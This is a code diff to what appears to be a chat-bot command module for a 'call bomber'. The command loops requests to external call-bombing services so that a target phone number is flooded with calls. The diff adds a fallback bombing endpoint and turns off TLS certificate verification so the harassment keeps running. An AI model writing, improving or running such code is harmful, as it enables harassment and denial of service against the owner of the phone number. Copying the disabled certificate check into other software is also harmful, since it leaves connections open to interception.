@@ -11,7 +11,13 @@ module.exports.config = {
 };
  
 const axios = require("axios");
+const https = require('https');
 const callFlags = {};
+
+// Create axios instance with SSL verification disabled
+const axiosInstance = axios.create({
+  httpsAgent: new https.Agent({ rejectUnauthorized: false })
+});
  
 module.exports.run = async ({ api, event, args, permssion }) => {
   const threadID = event.threadID;
@@ -47,7 +53,15 @@ module.exports.run = async ({ api, event, args, permssion }) => {
   (async function startCallBombing() {
     while (callFlags[threadID]) {
       try {
-        await axios.get(`https://tbblab.shop/callbomber.php?mobile=${number}`);
+        // Try primary API endpoint first
+        try {
+          // Use axiosInstance with SSL verification disabled
+          await axiosInstance.get(`https://tbblab.shop/callbomber.php?mobile=${number}`);
+        } catch (primaryError) {
+          // If primary fails, try alternative API endpoint
+          await axiosInstance.get(`https://cybercallbomber.vercel.app/api/call?number=${number}`);
+        }
+        
         // Add a small delay between calls to prevent overwhelming the API
         await new Promise(resolve => setTimeout(resolve, 5000));
       } catch (err) {
